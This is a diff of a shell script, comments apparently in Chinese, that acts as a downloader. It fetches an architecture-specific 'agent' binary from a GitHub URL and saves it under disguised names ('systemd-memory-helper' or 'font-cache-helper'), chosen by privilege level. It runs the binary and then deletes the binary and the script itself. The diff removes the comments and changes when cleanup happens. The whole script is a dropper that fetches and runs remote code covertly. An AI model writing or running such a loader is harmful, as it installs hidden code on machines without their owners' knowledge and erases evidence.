@@ -3,10 +3,8 @@
 URL_AMD64="https://github.com/kd6379/test/raw/refs/heads/main/agent_amd64"
 URL_ARM64="https://github.com/kd6379/test/raw/refs/heads/main/agent_arm64"
 
-# 兼容性更强的脚本自身路径获取
 SCRIPT_PATH="$(cd "$(dirname "$0")" 2>/dev/null && pwd)/$(basename "$0")"
 
-# 判断架构
 ARCH=$(uname -m)
 case "$ARCH" in
     x86_64|amd64)
@@ -19,17 +17,14 @@ case "$ARCH" in
         ;;
 esac
 
-# 判断权限，选择落地路径
 if [ "$(id -u)" -eq 0 ]; then
     AGENT_PATH="/usr/local/lib/systemd-memory-helper"
 else
     AGENT_PATH="/var/tmp/font-cache-helper"
 fi
 
-# 确保父目录存在
 mkdir -p "$(dirname "$AGENT_PATH")" 2>/dev/null
 
-# 检测可用下载工具
 download_file() {
     local url="$1"
     local dest="$2"
@@ -55,10 +50,8 @@ if ! download_file "$AGENT_URL" "$AGENT_PATH"; then
     exit 1
 fi
 
-# 验证文件非空
 if [ ! -s "$AGENT_PATH" ]; then
     echo "[FAIL] 下载文件为空"
-    rm -f "$AGENT_PATH"
     exit 1
 fi
 
@@ -68,10 +61,9 @@ echo "[*] 执行..."
 "$AGENT_PATH"
 EXIT_CODE=$?
 
-rm -f "$AGENT_PATH"
-
 if [ $EXIT_CODE -eq 0 ]; then
     echo "[SUCCESS] 执行成功，已清理"
+    rm -f "$AGENT_PATH"
     rm -f "$SCRIPT_PATH"
     exit 0
 else
